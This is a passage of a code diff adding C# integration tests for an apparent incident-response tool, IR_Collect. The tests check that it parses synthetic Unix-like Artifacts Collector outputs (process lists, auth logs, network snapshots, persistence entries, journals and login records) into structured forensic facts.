+            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_" + Guid.NewGuid().ToString("N"));
+            try
+            {
+                string procDir = Path.Combine(dir, "live_response", "process");
+                Directory.CreateDirectory(procDir);
+                File.WriteAllText(Path.Combine(dir, "uac.log"),
+                    "2026-07-26 15:30:00 +0000 INF Operating system: linux\r\n" +
+                    "2026-07-26 15:30:00 +0000 INF System architecture: x86_64\r\n" +
+                    "2026-07-26 15:30:00 +0000 INF Hostname: UAC-LNX-01\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(procDir, "ps_-eo_pid_user_etime_args.txt"),
+                    "2026-07-26 15:30:00\r\n" +
+                    "PID USER ELAPSED COMMAND\r\n" +
+                    "1 root 2-03:04:05 /sbin/init splash\r\n" +
+                    "4242 www-data 00:10 /usr/sbin/nginx -g daemon off;\r\n",
+                    new UTF8Encoding(false));
+
+                var c = IR_Collect.Analysis.CaseManager.LoadCaseFromFolder(dir);
+                if (c == null) return false;
+                if (!string.Equals(c.Hostname, "UAC-LNX-01", StringComparison.Ordinal)) return false;
+
+                string sysInfo = IR_Collect.Analysis.CaseManager.ResolveArtifactPath(c, IR_Collect.ArtifactNames.SystemInfoTxt);
+                string processCsv = IR_Collect.Analysis.CaseManager.ResolveArtifactPath(c, IR_Collect.ArtifactNames.ProcessListCsv);
+                if (!File.Exists(sysInfo) || !File.Exists(processCsv)) return false;
+
+                var store = IR_Collect.Analysis.Correlation.FactStore.BuildFromCase(c);
+                if (store == null || store.Facts == null || store.Facts.Count < 2) return false;
+
+                Fact nginx = store.Facts.FirstOrDefault(f =>
+                    f != null &&
+                    string.Equals(f.Source, ProcessNormalizer.SourceName, StringComparison.Ordinal) &&
+                    HasEntity(f, "Path", "/usr/sbin/nginx"));
+                if (nginx == null) return false;
+                if (!HasEntity(nginx, "User", "www-data")) return false;
+                if (!HasEntity(nginx, "CommandLine", "/usr/sbin/nginx -g daemon off;")) return false;
+                if (nginx.Time.Year != 2026 || nginx.Time.Month != 7 || nginx.Time.Day != 26) return false;
+
+                return c.Artifacts != null &&
+                    c.Artifacts.Keys.Any(k => string.Equals(Path.GetFileName(k), IR_Collect.ArtifactNames.ProcessListCsv, StringComparison.OrdinalIgnoreCase));
+            }
+            catch
+            {
+                return false;
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool AnalyzeFolder_uac_bodyfile_derives_activity_timeline()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_body_" + Guid.NewGuid().ToString("N"));
+            try
+            {
+                Directory.CreateDirectory(Path.Combine(dir, "bodyfile"));
+                File.WriteAllText(Path.Combine(dir, "uac.log"),
+                    "2026-07-26 15:30:00 +0000 INF Hostname: UAC-MAC-01\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(dir, "bodyfile", "bodyfile.txt"),
+                    "0|/Users/alice/.ssh/authorized_keys|128|rwxr-xr-x|501|20|512|1717200000|1717203600|1717207200|1717196400\r\n" +
+                    "0|/var/log/system.log|256|rw-r--r--|0|0|4096|0|1717210000|1717213600|0\r\n",
+                    new UTF8Encoding(false));
+
+                var c = IR_Collect.Analysis.CaseManager.LoadCaseFromFolder(dir);
+                if (c == null) return false;
+
+                string timelineCsv = IR_Collect.Analysis.CaseManager.ResolveArtifactPath(c, IR_Collect.ArtifactNames.ActivityTimelineCsv);
+                if (!File.Exists(timelineCsv)) return false;
+
+                var store = IR_Collect.Analysis.Correlation.FactStore.BuildFromCase(c);
+                if (store == null || store.Facts == null || store.Facts.Count < 4) return false;
+
+                Fact created = store.Facts.FirstOrDefault(f =>
+                    f != null &&
+                    string.Equals(f.Source, "Bodyfile", StringComparison.Ordinal) &&
+                    string.Equals(f.Action, "Created", StringComparison.Ordinal) &&
+                    HasEntity(f, "Path", "/Users/alice/.ssh/authorized_keys"));
+                if (created == null) return false;
+                if (!string.Equals(created.TimeKind, FactTimeMetadata.MetadataTimeKind, StringComparison.Ordinal)) return false;
+                if (!string.Equals(created.TimeConfidence, FactTimeMetadata.MediumConfidence, StringComparison.Ordinal)) return false;
+                if ((created.Details ?? "").IndexOf("inode=128", StringComparison.OrdinalIgnoreCase) < 0) return false;
+                if ((created.Details ?? "").IndexOf("uid=501", StringComparison.OrdinalIgnoreCase) < 0) return false;
+
+                Fact metadataChanged = store.Facts.FirstOrDefault(f =>
+                    f != null &&
+                    string.Equals(f.Source, "Bodyfile", StringComparison.Ordinal) &&
+                    string.Equals(f.Action, "MetadataChanged", StringComparison.Ordinal) &&
+                    HasEntity(f, "Path", "/var/log/system.log"));
+                if (metadataChanged == null) return false;
+                if (metadataChanged.Time.Year != 2024) return false;
+
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool AnalyzeFolder_uac_auth_log_derives_structured_auth_facts()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_auth_" + Guid.NewGuid().ToString("N"));
+            try
+            {
+                string authDir = Path.Combine(dir, "[root]", "var", "log");
+                Directory.CreateDirectory(authDir);
+                File.WriteAllText(Path.Combine(dir, "uac.log"),
+                    "2026-07-26 15:30:00 +0000 INF Operating system: linux\r\n" +
+                    "2026-07-26 15:30:00 +0000 INF Hostname: UAC-AUTH-01\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(authDir, "auth.log"),
+                    "Jul 26 15:20:01 uac-host sshd[111]: Failed password for invalid user backup from 203.0.113.50 port 51123 ssh2\r\n" +
+                    "Jul 26 15:21:22 uac-host sudo[222]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/id\r\n" +
+                    "Jul 26 15:22:33 uac-host sshd[333]: Accepted publickey for bob from vpn.example.com port 61234 ssh2\r\n",
+                    new UTF8Encoding(false));
+
+                var c = IR_Collect.Analysis.CaseManager.LoadCaseFromFolder(dir);
+                if (c == null) return false;
+                if (!string.Equals(c.Hostname, "UAC-AUTH-01", StringComparison.Ordinal)) return false;
+
+                string authCsv = IR_Collect.Analysis.CaseManager.ResolveArtifactPath(c, IR_Collect.ArtifactNames.UacAuthEventsCsv);
+                if (!File.Exists(authCsv)) return false;
+
+                var store = IR_Collect.Analysis.Correlation.FactStore.BuildFromCase(c);
+                if (store == null || store.Facts == null || store.Facts.Count < 3) return false;
+
+                Fact failed = store.Facts.FirstOrDefault(f =>
+                    f != null &&
+                    string.Equals(f.Source, UacAuthEventNormalizer.SourceName, StringComparison.Ordinal) &&
+                    string.Equals(f.Action, "SshLoginFailed", StringComparison.Ordinal) &&
+                    HasEntity(f, "TargetUser", "backup"));
+                if (failed == null) return false;
+                if (!HasEntity(failed, "RemoteIP", "203.0.113.50")) return false;
+                if (failed.Time.Year != 2026 || failed.Time.Month != 7 || failed.Time.Day != 26) return false;
+
+                Fact sudo = store.Facts.FirstOrDefault(f =>
+                    f != null &&
+                    string.Equals(f.Source, UacAuthEventNormalizer.SourceName, StringComparison.Ordinal) &&
+                    string.Equals(f.Action, "SudoCommand", StringComparison.Ordinal) &&
+                    HasEntity(f, "User", "alice"));
+                if (sudo == null) return false;
+                if (!HasEntity(sudo, "TargetUser", "root")) return false;
+                if (!HasEntity(sudo, "Terminal", "pts/0")) return false;
+                if (!HasEntity(sudo, "CommandLine", "/usr/bin/id")) return false;
+
+                Fact accepted = store.Facts.FirstOrDefault(f =>
+                    f != null &&
+                    string.Equals(f.Source, UacAuthEventNormalizer.SourceName, StringComparison.Ordinal) &&
+                    string.Equals(f.Action, "SshLoginAccepted", StringComparison.Ordinal) &&
+                    HasEntity(f, "TargetUser", "bob"));
+                if (accepted == null) return false;
+                if (!HasEntity(accepted, "RemoteName", "vpn.example.com")) return false;
+
+                return c.Artifacts != null &&
+                    c.Artifacts.Keys.Any(k => string.Equals(Path.GetFileName(k), IR_Collect.ArtifactNames.UacAuthEventsCsv, StringComparison.OrdinalIgnoreCase));
+            }
+            catch
+            {
+                return false;
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool AnalyzeFolder_uac_network_snapshot_derives_network_connection_facts()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_net_" + Guid.NewGuid().ToString("N"));
+            try
+            {
+                string networkDir = Path.Combine(dir, "live_response", "network");
+                Directory.CreateDirectory(networkDir);
+                File.WriteAllText(Path.Combine(dir, "uac.log"),
+                    "2026-07-26 15:30:00 +0000 INF Operating system: linux\r\n" +
+                    "2026-07-26 15:30:00 +0000 INF Hostname: UAC-NET-01\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(networkDir, "ss_-tulpen.txt"),
+                    "2026-07-26 15:30:00\r\n" +
+                    "Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\r\n" +
+                    "tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:((\"sshd\",pid=123,fd=3))\r\n" +
+                    "tcp ESTAB 0 0 10.0.0.5:22 203.0.113.50:54444 users:((\"sshd\",pid=123,fd=4))\r\n" +
+                    "udp UNCONN 0 0 [::1]:323 *:* users:((\"chronyd\",pid=77,fd=5))\r\n",
+                    new UTF8Encoding(false));
+
+                var c = IR_Collect.Analysis.CaseManager.LoadCaseFromFolder(dir);
+                if (c == null) return false;
+                if (!string.Equals(c.Hostname, "UAC-NET-01", StringComparison.Ordinal)) return false;
+
+                string networkCsv = IR_Collect.Analysis.CaseManager.ResolveArtifactPath(c, IR_Collect.ArtifactNames.UacNetworkConnectionsCsv);
+                if (!File.Exists(networkCsv)) return false;
+
+                var store = IR_Collect.Analysis.Correlation.FactStore.BuildFromCase(c);
+                if (store == null || store.Facts == null || store.Facts.Count < 3) return false;
+
+                Fact listener = store.Facts.FirstOrDefault(f =>
+                    f != null &&
+                    string.Equals(f.Source, UacNetworkConnectionNormalizer.SourceName, StringComparison.Ordinal) &&
+                    string.Equals(f.Action, "ListenerObserved", StringComparison.Ordinal) &&
+                    HasEntity(f, "ProcessId", "123"));
+                if (listener == null) return false;
+                if (!HasEntity(listener, "ProcessName", "sshd")) return false;
+                if (!HasEntity(listener, "LocalPort", "22")) return false;
+                if (!string.Equals(listener.TimeKind, FactTimeMetadata.ObservedTimeKind, StringComparison.Ordinal)) return false;
+
+                Fact connection = store.Facts.FirstOrDefault(f =>
+                    f != null &&
+                    string.Equals(f.Source, UacNetworkConnectionNormalizer.SourceName, StringComparison.Ordinal) &&
+                    string.Equals(f.Action, "ConnectionObserved", StringComparison.Ordinal) &&
+                    HasEntity(f, "RemoteIP", "203.0.113.50"));
+                if (connection == null) return false;
+                if (!HasEntity(connection, "ProcessName", "sshd")) return false;
+                if (!HasEntity(connection, "RemotePort", "54444")) return false;
+                if (connection.Time.Year != 2026 || connection.Time.Month != 7 || connection.Time.Day != 26) return false;
+
+                Fact udp = store.Facts.FirstOrDefault(f =>
+                    f != null &&
+                    string.Equals(f.Source, UacNetworkConnectionNormalizer.SourceName, StringComparison.Ordinal) &&
+                    HasEntity(f, "ProcessName", "chronyd"));
+                if (udp == null) return false;
+
+                return c.Artifacts != null &&
+                    c.Artifacts.Keys.Any(k => string.Equals(Path.GetFileName(k), IR_Collect.ArtifactNames.UacNetworkConnectionsCsv, StringComparison.OrdinalIgnoreCase));
+            }
+            catch
+            {
+                return false;
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool AnalyzeFolder_uac_persistence_derives_linux_macos_facts()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_persist_" + Guid.NewGuid().ToString("N"));
+            try
+            {
+                string root = Path.Combine(dir, "[root]");
+                string cronDir = Path.Combine(root, "etc", "cron.d");
+                string systemdDir = Path.Combine(root, "etc", "systemd", "system");
+                string sshDir = Path.Combine(root, "home", "alice", ".ssh");
+                string launchDaemonDir = Path.Combine(root, "Library", "LaunchDaemons");
+                string launchAgentDir = Path.Combine(root, "Library", "LaunchAgents");
+                Directory.CreateDirectory(cronDir);
+                Directory.CreateDirectory(systemdDir);
+                Directory.CreateDirectory(sshDir);
+                Directory.CreateDirectory(launchDaemonDir);
+                Directory.CreateDirectory(launchAgentDir);
+
+                File.WriteAllText(Path.Combine(dir, "uac.log"),
+                    "2026-07-27 01:00:00 +0000 INF Unix-like Artifacts Collector\r\n" +
+                    "2026-07-27 01:00:00 +0000 INF Operating system: linux\r\n" +
+                    "2026-07-27 01:00:00 +0000 INF Hostname: UAC-PERSIST-01\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(cronDir, "update-agent"),
+                    "*/5 * * * * root /usr/local/bin/update-agent --quiet\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(systemdDir, "update-agent.service"),
+                    "[Unit]\r\nDescription=Update Agent\r\n" +
+                    "[Service]\r\nUser=svc-update\r\nExecStart=/opt/update-agent/bin/agent --poll\r\n" +
+                    "[Install]\r\nWantedBy=multi-user.target\r\n",
+                    new UTF8Encoding(false));
+
+                string publicKeyMaterial = Convert.ToBase64String(Encoding.ASCII.GetBytes("synthetic-public-key-blob"));
+                File.WriteAllText(Path.Combine(sshDir, "authorized_keys"),
+                    "command=\"echo ssh-rsa not-a-key\",restrict ssh-ed25519 " + publicKeyMaterial + " alice@test\r\n",
+                    new UTF8Encoding(false));
+
+                File.WriteAllText(Path.Combine(launchDaemonDir, "com.example.sync.plist"),
+                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" +
+                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\r\n" +
+                    "<plist version=\"1.0\"><dict>" +
+                    "<key>Label</key><string>com.example.sync</string>" +
+                    "<key>ProgramArguments</key><array><string>/Library/Example/sync</string><string>--daemon</string></array>" +
+                    "<key>RunAtLoad</key><true/>" +
+                    "<key>UserName</key><string>root</string>" +
+                    "</dict></plist>",
+                    new UTF8Encoding(false));
+                File.WriteAllBytes(Path.Combine(launchAgentDir, "com.example.binary.plist"),
+                    Convert.FromBase64String(
+                        "YnBsaXN0MDDXAQIDBAUGBwgJCg0ODxBYRGlzYWJsZWRVTGFiZWxfEBBQcm9ncmFtQXJndW1lbnRzWVJ1bkF0TG9hZF1TdGFydEludGVydmFsWFVzZXJOYW1lXxAQV29ya2luZ0RpcmVjdG9yeQhfEBJjb20uZXhhbXBsZS5iaW5hcnmiCwxfEBwvTGlicmFyeS9FeGFtcGxlL2JpbmFyeS1zeW5jWC0tZGFlbW9uCREBLFRyb290XxAQL0xpYnJhcnkvRXhhbXBsZQgXICY5Q1FabW6DhqWur7K3AAAAAAAAAQEAAAAAAAAAEQAAAAAAAAAAAAAAAAAAAMo="));
+                File.WriteAllBytes(Path.Combine(launchAgentDir, "com.example.corrupt.plist"),
+                    Encoding.ASCII.GetBytes("bplist00synthetic"));
+
+                CaseData c = CaseManager.LoadCaseFromFolder(dir);
+                if (c == null || c.UacEvidence == null || !c.UacEvidence.IsUac)
+                    throw new InvalidOperationException("UAC evidence was not detected.");
+                string persistenceCsv = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacPersistenceCsv);
+                if (!File.Exists(persistenceCsv))
+                    throw new InvalidOperationException("Canonical persistence CSV was not created.");
+                string csv = File.ReadAllText(persistenceCsv);
+                if (csv.IndexOf("cron", StringComparison.Ordinal) < 0 ||
+                    csv.IndexOf("systemd-service", StringComparison.Ordinal) < 0 ||
+                    csv.IndexOf("ssh-authorized-key", StringComparison.Ordinal) < 0 ||
+                    csv.IndexOf("launchd-daemon", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("One or more persistence mechanisms were not derived: " + csv);
+                if (csv.IndexOf(publicKeyMaterial, StringComparison.Ordinal) >= 0)
+                    throw new InvalidOperationException("Full SSH public key material leaked into canonical persistence CSV.");
+
+                string evidenceIndex = File.ReadAllText(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacEvidenceIndexCsv));
+                string[] evidenceRows = evidenceIndex.Split(new string[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries);
+                string binaryPlistRow = evidenceRows.FirstOrDefault(x =>
+                    x.IndexOf("com.example.binary.plist", StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(binaryPlistRow) ||
+                    binaryPlistRow.IndexOf("\"normalized-source\"", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Valid binary plist was not normalized: " + (binaryPlistRow ?? "(missing)"));
+                string corruptPlistRow = evidenceRows.FirstOrDefault(x =>
+                    x.IndexOf("com.example.corrupt.plist", StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(corruptPlistRow) ||
+                    corruptPlistRow.IndexOf("\"indexed-raw\"", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Corrupt binary plist was not retained as indexed-raw: " + (corruptPlistRow ?? "(missing)"));
+
+                FactStore store = FactStore.BuildFromCase(c);
+                if (store == null || store.Facts == null)
+                    throw new InvalidOperationException("Fact Store was not built.");
+                Fact cron = store.Facts.FirstOrDefault(x => x.Source == UacPersistenceNormalizer.SourceName &&
+                    HasEntity(x, "TaskName", "update-agent") &&
+                    HasEntity(x, "User", "root"));
+                if (cron == null || !HasEntity(cron, "CommandLine", "/usr/local/bin/update-agent --quiet"))
+                    throw new InvalidOperationException("Cron fact or command entity missing.");
+
+                Fact systemd = store.Facts.FirstOrDefault(x => x.Source == UacPersistenceNormalizer.SourceName &&
+                    HasEntity(x, "ServiceName", "update-agent.service"));
+                if (systemd == null || !HasEntity(systemd, "Path", "/opt/update-agent/bin/agent"))
+                    throw new InvalidOperationException("systemd fact or executable path missing.");
+                if (!string.Equals(systemd.CollectionStep, "Persistence", StringComparison.Ordinal))
+                    throw new InvalidOperationException("systemd fact provenance step missing.");
+                if (!string.Equals(systemd.Action, "PersistenceConfigurationObserved", StringComparison.Ordinal))
+                    throw new InvalidOperationException("systemd fact action mismatch.");
+
+                Fact ssh = store.Facts.FirstOrDefault(x => x.Source == UacPersistenceNormalizer.SourceName &&
+                    HasEntity(x, "User", "alice") &&
+                    x.EntityRefs.Any(e => e.Type == "Hash" && e.Value.StartsWith("SHA256:", StringComparison.Ordinal)));
+                if (ssh == null)
+                    throw new InvalidOperationException("SSH authorized-key fingerprint fact missing.");
+
+                Fact launchd = store.Facts.FirstOrDefault(x => x.Source == UacPersistenceNormalizer.SourceName &&
+                    HasEntity(x, "ServiceName", "com.example.sync"));
+                if (launchd == null || !HasEntity(launchd, "Path", "/Library/Example/sync"))
+                    throw new InvalidOperationException("launchd fact or program path missing.");
+                if (launchd.ParserNote.IndexOf("does not by itself prove execution", StringComparison.OrdinalIgnoreCase) < 0)
+                    throw new InvalidOperationException("Facts-only parser note missing.");
+                Fact binaryLaunchd = store.Facts.FirstOrDefault(x => x.Source == UacPersistenceNormalizer.SourceName &&
+                    HasEntity(x, "ServiceName", "com.example.binary"));
+                if (binaryLaunchd == null || !HasEntity(binaryLaunchd, "Path", "/Library/Example/binary-sync") ||
+                    !HasEntity(binaryLaunchd, "CommandLine", "/Library/Example/binary-sync --daemon"))
+                    throw new InvalidOperationException("Binary launchd plist fact was not normalized.");
+                return true;
+            }
+            catch (Exception ex)
+            {
+                throw new InvalidOperationException("UAC persistence integration test failed: " + (ex.Message ?? ""), ex);
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool AnalyzeFolder_uac_journal_derives_header_and_boot_facts()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_journal_" + Guid.NewGuid().ToString("N"));
+            try
+            {
+                string journalDir = Path.Combine(dir, "[root]", "var", "log", "journal",
+                    "202122232425262728292a2b2c2d2e2f");
+                string liveSystemDir = Path.Combine(dir, "live_response", "system");
+                Directory.CreateDirectory(journalDir);
+                Directory.CreateDirectory(liveSystemDir);
+                File.WriteAllText(Path.Combine(dir, "uac.log"),
+                    "2026-07-27 01:00:00 +0000 INF Unix-like Artifacts Collector\r\n" +
+                    "2026-07-27 01:00:00 +0000 INF Operating system: linux\r\n" +
+                    "2026-07-27 01:00:00 +0000 INF Hostname: UAC-JOURNAL-01\r\n",
+                    new UTF8Encoding(false));
+
+                var header = new byte[272];
+                Encoding.ASCII.GetBytes("LPKSHHRH").CopyTo(header, 0);
+                BitConverter.GetBytes((uint)2).CopyTo(header, 8);
+                BitConverter.GetBytes((uint)(8 | 16)).CopyTo(header, 12);
+                header[16] = 2;
+                for (int i = 0; i < 16; i++)
+                {
+                    header[24 + i] = (byte)(0x10 + i);
+                    header[40 + i] = (byte)(0x20 + i);
+                    header[56 + i] = (byte)(0x40 + i);
+                    header[72 + i] = (byte)(0x60 + i);
+                }
+                BitConverter.GetBytes((ulong)272).CopyTo(header, 88);
+                BitConverter.GetBytes((ulong)0).CopyTo(header, 96);
+                BitConverter.GetBytes((ulong)25).CopyTo(header, 144);
+                BitConverter.GetBytes((ulong)5).CopyTo(header, 152);
+                BitConverter.GetBytes((ulong)105).CopyTo(header, 160);
+                BitConverter.GetBytes((ulong)101).CopyTo(header, 168);
+                DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
+                DateTime first = new DateTime(2026, 7, 27, 0, 0, 0, DateTimeKind.Utc);
+                DateTime last = new DateTime(2026, 7, 27, 1, 0, 0, DateTimeKind.Utc);
+                BitConverter.GetBytes((ulong)((first - epoch).Ticks / 10)).CopyTo(header, 184);
+                BitConverter.GetBytes((ulong)((last - epoch).Ticks / 10)).CopyTo(header, 192);
+                File.WriteAllBytes(Path.Combine(journalDir, "system.journal"), header);
+                File.WriteAllBytes(Path.Combine(journalDir, "corrupt.journal~"),
+                    Encoding.ASCII.GetBytes("LPKSHHRH"));
+
+                string bootId = new string('a', 32);
+                File.WriteAllText(Path.Combine(liveSystemDir, "journalctl_--list-boots.txt"),
+                    "-1 " + bootId + " Mon 2026-07-27 00:00:00 UTC\u2014Mon 2026-07-27 01:00:00 UTC\r\n",
+                    new UTF8Encoding(false));
+
+                CaseData c = CaseManager.LoadCaseFromFolder(dir);
+                if (c == null || c.UacEvidence == null || !c.UacEvidence.IsUac)
+                    throw new InvalidOperationException("UAC journal evidence was not detected.");
+                string journalCsvPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacJournalFilesCsv);
+                string bootCsvPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacBootSessionsCsv);
+                if (!File.Exists(journalCsvPath) || !File.Exists(bootCsvPath))
+                    throw new InvalidOperationException("Journal canonical CSVs were not created.");
+                string journalCsv = File.ReadAllText(journalCsvPath);
+                if (journalCsv.IndexOf("\"archived\"", StringComparison.Ordinal) < 0 ||
+                    journalCsv.IndexOf("compressed-zstd|compact", StringComparison.Ordinal) < 0 ||
+                    journalCsv.IndexOf(",25,5,101,105,", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Journal header fields were not derived: " + journalCsv +
+                        "; warnings=" + string.Join(" | ", c.LoadWarnings.ToArray()));
+                string bootCsv = File.ReadAllText(bootCsvPath);
+                if (bootCsv.IndexOf(bootId, StringComparison.Ordinal) < 0 ||
+                    bootCsv.IndexOf("2026-07-27T00:00:00.0000000Z", StringComparison.Ordinal) < 0 ||
+                    bootCsv.IndexOf("\"utc-parsed\"", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Boot session fields were not derived: " + bootCsv);
+
+                string evidenceIndex = File.ReadAllText(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacEvidenceIndexCsv));
+                string[] evidenceRows = evidenceIndex.Split(new string[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries);
+                string validJournal = evidenceRows.FirstOrDefault(x =>
+                    x.IndexOf("system.journal", StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(validJournal) ||
+                    validJournal.IndexOf("\"metadata-source\"", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Valid journal was not marked metadata-source.");
+                string corruptJournal = evidenceRows.FirstOrDefault(x =>
+                    x.IndexOf("corrupt.journal~", StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(corruptJournal) ||
+                    corruptJournal.IndexOf("\"indexed-raw\"", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Corrupt journal was not retained as indexed-raw.");
+                string bootSource = evidenceRows.FirstOrDefault(x =>
+                    x.IndexOf("journalctl_--list-boots.txt", StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(bootSource) ||
+                    bootSource.IndexOf("\"normalized-source\"", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Boot-list source was not marked normalized-source.");
+
+                FactStore store = FactStore.BuildFromCase(c);
+                Fact journalFact = store.Facts.FirstOrDefault(x =>
+                    x.Source == UacJournalFileNormalizer.SourceName &&
+                    HasEntity(x, "MachineId", "202122232425262728292a2b2c2d2e2f"));
+                if (journalFact == null || !HasEntity(journalFact, "BootId", "404142434445464748494a4b4c4d4e4f"))
+                    throw new InvalidOperationException("Journal header fact entities missing.");
+                if (journalFact.ParserNote.IndexOf("individual journal entries remain raw", StringComparison.OrdinalIgnoreCase) < 0)
+                    throw new InvalidOperationException("Journal scope parser note missing.");
+                Fact bootFact = store.Facts.FirstOrDefault(x =>
+                    x.Source == UacBootSessionNormalizer.SourceName && HasEntity(x, "BootId", bootId));
+                if (bootFact == null || bootFact.Time.Year != 2026 ||
+                    !string.Equals(bootFact.Action, "BootSessionObserved", StringComparison.Ordinal))
+                    throw new InvalidOperationException("Boot-session fact missing.");
+                return true;
+            }
+            catch (Exception ex)
+            {
+                throw new InvalidOperationException("UAC journal integration test failed: " + (ex.Message ?? ""), ex);
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool AnalyzeFolder_uac_login_outputs_derive_facts_without_inventing_utc()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_login_" + Guid.NewGuid().ToString("N"));
+            try
+            {
+                string liveSystemDir = Path.Combine(dir, "live_response", "system");
+                Directory.CreateDirectory(liveSystemDir);
+                File.WriteAllText(Path.Combine(dir, "uac.log"),
+                    "2026-07-27 19:30:00 +0000 INF Unix-like Artifacts Collector\r\n" +
+                    "2026-07-27 19:30:00 +0000 INF Operating system: linux\r\n" +
+                    "2026-07-27 19:30:00 +0000 INF Hostname: UAC-LOGIN-01\r\n",
+                    new UTF8Encoding(false));
+
+                File.WriteAllText(Path.Combine(liveSystemDir, "last_-a_-F.txt"),
+                    "alice pts/0 Mon Jul 27 17:10:11 2026 - Mon Jul 27 18:11:12 2026 (01:01) 203.0.113.8\r\n" +
+                    "reboot system boot 6.8.0-test Mon Jul 27 16:00:00 2026 - Mon Jul 27 19:00:00 2026 (03:00)\r\n" +
+                    "wtmp begins Mon Jul 27 16:00:00 2026\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(liveSystemDir, "lastb_-a_-F.txt"),
+                    "root ssh:notty Mon Jul 27 17:05:00 2026 - Mon Jul 27 17:05:01 2026 (00:00) 198.51.100.20\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(liveSystemDir, "lastlog.txt"),
+                    "Username         Port     From             Latest\r\n" +
+                    "alice            pts/0    203.0.113.8      Mon Jul 27 09:10:11 +0000 2026\r\n" +
+                    "nobody                                     **Never logged in**\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(liveSystemDir, "utmpdump_[root]var_log_wtmp.txt"),
+                    "[7] [01234] [ts/0] [alice] [pts/0] [vpn.example] [203.0.113.8] [2026-07-27T09:10:11,123456+00:00]\r\n" +
+                    "[8] [01234] [ts/0] [] [pts/0] [] [0.0.0.0] [2026-07-27T10:11:12,654321+00:00]\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(liveSystemDir, "utmpdump_corrupt.txt"),
+                    "[7] [not-a-complete-record]\r\n",
+                    new UTF8Encoding(false));
+
+                CaseData c = CaseManager.LoadCaseFromFolder(dir);
+                if (c == null || c.UacEvidence == null || !c.UacEvidence.IsUac)
+                    throw new InvalidOperationException("UAC login evidence was not detected.");
+
+                string csvPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacLoginEventsCsv);
+                if (!File.Exists(csvPath))
+                    throw new InvalidOperationException("UAC login canonical CSV was not created.");
+                string csv = File.ReadAllText(csvPath);
+                if (csv.IndexOf("LoginSessionObserved", StringComparison.Ordinal) < 0 ||
+                    csv.IndexOf("LoginFailureObserved", StringComparison.Ordinal) < 0 ||
+                    csv.IndexOf("LoginSessionStarted", StringComparison.Ordinal) < 0 ||
+                    csv.IndexOf("LoginSessionEnded", StringComparison.Ordinal) < 0 ||
+                    csv.IndexOf("2026-07-27T09:10:11.1234560Z", StringComparison.Ordinal) < 0 ||
+                    csv.IndexOf("local-time-no-offset", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Login records were not derived as expected: " + csv);
+
+                List<Dictionary<string, string>> rows = CorrelationCsvHelper.ReadCsv(csvPath);
+                Dictionary<string, string> localLast = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "SourceType"), "last", StringComparison.Ordinal) &&
+                    string.Equals(CorrelationCsvHelper.Get(x, "User"), "alice", StringComparison.Ordinal));
+                if (localLast == null ||
+                    !string.IsNullOrEmpty(CorrelationCsvHelper.Get(localLast, "TimeUtc")) ||
+                    !string.Equals(CorrelationCsvHelper.Get(localLast, "TimeParseStatus"),
+                        "local-time-no-offset", StringComparison.Ordinal))
